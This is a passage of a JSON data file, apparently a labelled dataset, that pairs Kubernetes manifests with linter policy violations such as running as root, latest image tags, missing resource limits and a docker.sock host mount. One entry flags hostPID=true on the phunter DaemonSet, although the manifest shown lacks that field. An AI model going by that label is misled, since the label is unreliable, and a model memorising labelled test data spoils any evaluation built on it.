STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-2.8.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.7.0=quay.io/strimzi/kafka:latest-kafka-2.7.0\n\n            2.7.1=quay.io/strimzi/kafka:latest-kafka-2.7.1\n\n            2.8.0=quay.io/strimzi/kafka:latest-kafka-2.8.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.20.2\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"strimzi-cluster-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8360",
    "manifest_path": "data/manifests/the_stack_sample/sample_3116.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blue\n  labels:\n    name: app\n    app: nginxjs\n    color: blue\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: nginxjs\n      color: blue\n      name: app\n  template:\n    metadata:\n      name: blue\n      labels:\n        name: app\n        app: nginxjs\n        color: blue\n    spec:\n      containers:\n      - image: docker.io/tkawavmw/citest:7cbfc9a62358f2234921feb28bd1dd54f90ae104\n        name: blue\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8361",
    "manifest_path": "data/manifests/the_stack_sample/sample_3116.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blue\n  labels:\n    name: app\n    app: nginxjs\n    color: blue\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: nginxjs\n      color: blue\n      name: app\n  template:\n    metadata:\n      name: blue\n      labels:\n        name: app\n        app: nginxjs\n        color: blue\n    spec:\n      containers:\n      - image: docker.io/tkawavmw/citest:7cbfc9a62358f2234921feb28bd1dd54f90ae104\n        name: blue\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blue\" does not have a read-only root file system"
  },
  {
    "id": "8362",
    "manifest_path": "data/manifests/the_stack_sample/sample_3116.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blue\n  labels:\n    name: app\n    app: nginxjs\n    color: blue\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: nginxjs\n      color: blue\n      name: app\n  template:\n    metadata:\n      name: blue\n      labels:\n        name: app\n        app: nginxjs\n        color: blue\n    spec:\n      containers:\n      - image: docker.io/tkawavmw/citest:7cbfc9a62358f2234921feb28bd1dd54f90ae104\n        name: blue\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blue\" is not set to runAsNonRoot"
  },
  {
    "id": "8363",
    "manifest_path": "data/manifests/the_stack_sample/sample_3116.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blue\n  labels:\n    name: app\n    app: nginxjs\n    color: blue\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: nginxjs\n      color: blue\n      name: app\n  template:\n    metadata:\n      name: blue\n      labels:\n        name: app\n        app: nginxjs\n        color: blue\n    spec:\n      containers:\n      - image: docker.io/tkawavmw/citest:7cbfc9a62358f2234921feb28bd1dd54f90ae104\n        name: blue\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"blue\" has cpu request 0"
  },
  {
    "id": "8364",
    "manifest_path": "data/manifests/the_stack_sample/sample_3116.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blue\n  labels:\n    name: app\n    app: nginxjs\n    color: blue\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: nginxjs\n      color: blue\n      name: app\n  template:\n    metadata:\n      name: blue\n      labels:\n        name: app\n        app: nginxjs\n        color: blue\n    spec:\n      containers:\n      - image: docker.io/tkawavmw/citest:7cbfc9a62358f2234921feb28bd1dd54f90ae104\n        name: blue\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"blue\" has memory limit 0"
  },
  {
    "id": "8365",
    "manifest_path": "data/manifests/the_stack_sample/sample_3117.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: nginx\n  name: nginx-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: nginx-deploy\n  template:\n    metadata:\n      labels:\n        run: nginx-deploy\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8366",
    "manifest_path": "data/manifests/the_stack_sample/sample_3117.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: nginx\n  name: nginx-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: nginx-deploy\n  template:\n    metadata:\n      labels:\n        run: nginx-deploy\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8367",
    "manifest_path": "data/manifests/the_stack_sample/sample_3117.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: nginx\n  name: nginx-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: nginx-deploy\n  template:\n    metadata:\n      labels:\n        run: nginx-deploy\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8368",
    "manifest_path": "data/manifests/the_stack_sample/sample_3117.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: nginx\n  name: nginx-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: nginx-deploy\n  template:\n    metadata:\n      labels:\n        run: nginx-deploy\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8369",
    "manifest_path": "data/manifests/the_stack_sample/sample_3117.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: nginx\n  name: nginx-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: nginx-deploy\n  template:\n    metadata:\n      labels:\n        run: nginx-deploy\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8370",
    "manifest_path": "data/manifests/the_stack_sample/sample_3118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n        version: v1.0\n    spec:\n      containers:\n      - name: cowweb\n        image: iad.ocir.io/gse00014510/handson-008/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8371",
    "manifest_path": "data/manifests/the_stack_sample/sample_3118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n        version: v1.0\n    spec:\n      containers:\n      - name: cowweb\n        image: iad.ocir.io/gse00014510/handson-008/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cowweb\" does not have a read-only root file system"
  },
  {
    "id": "8372",
    "manifest_path": "data/manifests/the_stack_sample/sample_3118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n        version: v1.0\n    spec:\n      containers:\n      - name: cowweb\n        image: iad.ocir.io/gse00014510/handson-008/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cowweb\" is not set to runAsNonRoot"
  },
  {
    "id": "8373",
    "manifest_path": "data/manifests/the_stack_sample/sample_3118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n        version: v1.0\n    spec:\n      containers:\n      - name: cowweb\n        image: iad.ocir.io/gse00014510/handson-008/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cowweb\" has cpu request 0"
  },
  {
    "id": "8374",
    "manifest_path": "data/manifests/the_stack_sample/sample_3118.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cowweb\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: cowweb\n  template:\n    metadata:\n      labels:\n        app: cowweb\n        version: v1.0\n    spec:\n      containers:\n      - name: cowweb\n        image: iad.ocir.io/gse00014510/handson-008/cowweb:v1.0\n        ports:\n        - name: api\n          containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 5\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /cowsay/ping\n            port: api\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cowweb\" has memory limit 0"
  },
  {
    "id": "8375",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"phunter\""
  },
  {
    "id": "8376",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"phunter\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "8377",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "8378",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"phunter\" is using an invalid container image, \"phunter:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8379",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"phunter\" does not have a read-only root file system"
  },
  {
    "id": "8380",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"phunter\" is not set to runAsNonRoot"
  },
  {
    "id": "8381",
    "manifest_path": "data/manifests/the_stack_sample/sample_3119.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: phunter\n  labels:\n    app: phunter\nspec:\n  selector:\n    matchLabels:\n      app: phunter\n  template:\n    metadata:\n      labels:\n        app: phunter\n    spec:\n      containers:\n      - name: phunter\n        env:\n        - name: PHUNTER_CONFIG_FILE\n          value: /config/config-example.yml\n        - name: PHUNTER_LOG_LEVEL\n          value: INFO\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        resources:\n          limits:\n            memory: 256Mi\n        securityContext:\n          capabilities:\n            add:\n            - SYS_PTRACE\n        ports:\n        - containerPort: 9000\n        imagePullPolicy: Always\n        image: phunter:latest\n        volumeMounts:\n        - name: phunter-config\n          mountPath: /config\n        - name: dockersocket\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: phunter-config\n        configMap:\n          name: phunter-config\n      - name: dockersocket\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"phunter\" has cpu request 0"
  },
  {
    "id": "8382",
    "manifest_path": "data/manifests/the_stack_sample/sample_3120.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:4.0.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        - --cache-server=cache:6379\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "8383",
    "manifest_path": "data/manifests/the_stack_sample/sample_3120.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:4.0.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        - --cache-server=cache:6379\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "8384",
    "manifest_path": "data/manifests/the_stack_sample/sample_3121.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: vadimrepo/ui\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ui\" is using an invalid container image, \"vadimrepo/ui\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8385",
    "manifest_path": "data/manifests/the_stack_sample/sample_3121.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: vadimrepo/ui\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ui\" does not have a read-only root file system"
  },
  {
    "id": "8386",
    "manifest_path": "data/manifests/the_stack_sample/sample_3121.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: vadimrepo/ui\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ui\" is not set to runAsNonRoot"
  },
  {
    "id": "8387",
    "manifest_path": "data/manifests/the_stack_sample/sample_3121.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: vadimrepo/ui\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ui\" has cpu request 0"
  },
  {
    "id": "8388",
    "manifest_path": "data/manifests/the_stack_sample/sample_3121.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: vadimrepo/ui\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ui\" has memory limit 0"
  },
  {
    "id": "8389",
    "manifest_path": "data/manifests/the_stack_sample/sample_3123.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borodapravitmirom/hipsterpayment:1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8390",
    "manifest_path": "data/manifests/the_stack_sample/sample_3123.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borodapravitmirom/hipsterpayment:1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "8391",
    "manifest_path": "data/manifests/the_stack_sample/sample_3123.yaml",
